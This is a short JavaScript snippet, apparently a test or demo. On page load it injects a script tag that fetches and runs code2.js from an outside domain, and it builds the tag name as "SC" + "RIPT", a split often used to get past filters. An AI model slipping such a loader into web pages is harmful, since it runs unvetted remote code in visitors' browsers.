(function(){
	
	function loadScript (server, initFunction, parameters, errorFunction) {
		var srctag = document.createElement("SC" + "RIPT");
		srctag.src = server;
		srctag.type = "text/javascript";
		srctag.charset = "utf-8";
		srctag.language = "javascript";
		srctag._parameters = parameters;
		srctag._function = initFunction;
		srctag._errFunction = errorFunction;
		srctag.onload = function () {
			// We can have a ready state change for both complete and loaded, and we only want one call to the initFunction
			this.onreadystatechange = null;
			this.onload = null;
			this._function(this._parameters);
		};
		srctag.onreadystatechange = function () {// workaround for IE only
			if (this.readyState == 'complete' || this.readyState == 'loaded') {
				// We can have a ready state change for both complete and loaded, and we only want one call to the initFunction
				this.onreadystatechange = null;
				this.onload = null;
				this._function(this._parameters);
			}
		};
		srctag.onerror = function (msg) {
			this.onreadystatechange = null;
			this.onload = null;
			if (typeof this._errFunction == 'function') {
				this._errFunction(msg);
			}
		};
		document.body.appendChild(srctag);
	}

	document.addEventListener("DOMContentLoaded", function(event) { 
		loadScript("https://dud-page.pixagreat.com/code2.js", 
			function(){
				console.log('code 2 was init!');
			}, 
			null,
			function(){
				alert('code 2 error');
			}
		);
	});	
			
	
})();